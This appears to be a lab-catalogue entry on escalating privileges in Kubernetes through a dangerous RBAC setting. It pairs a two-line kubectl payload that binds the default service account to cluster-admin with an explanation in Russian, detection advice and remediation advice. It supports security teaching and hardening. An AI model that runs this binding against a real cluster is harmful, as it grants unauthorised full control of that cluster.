---
id: k8s-rbac-escape
title: "Kubernetes: Эскалация через опасный RBAC"
type: cloud
target: kubernetes
difficulty: intermediate
bypass: none
risk: high
cwe: "CWE-269"
tested_on: ["K8s 1.28", "container-labs"]
success_rate: 0.9
lab: "labs/container-labs"
status: draft
---

# Kubernetes: Эскалация через опасный RBAC

## Payload

```bash
kubectl auth can-i --list
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default
```

## Explanation

Если ServiceAccount пода имеет права на создание `ClusterRoleBinding`, злоумышленник может выдать себе роль `cluster-admin` и получить полный контроль над кластером.

## Detection

Ищите в аудит-логах Kubernetes события `create clusterrolebinding` от непривилегированных ServiceAccount.

## Remediation

Ограничьте права `create` для ресурсов `clusterrolebindings` и `roles`. Используйте OPA Gatekeeper для валидации.

```

```
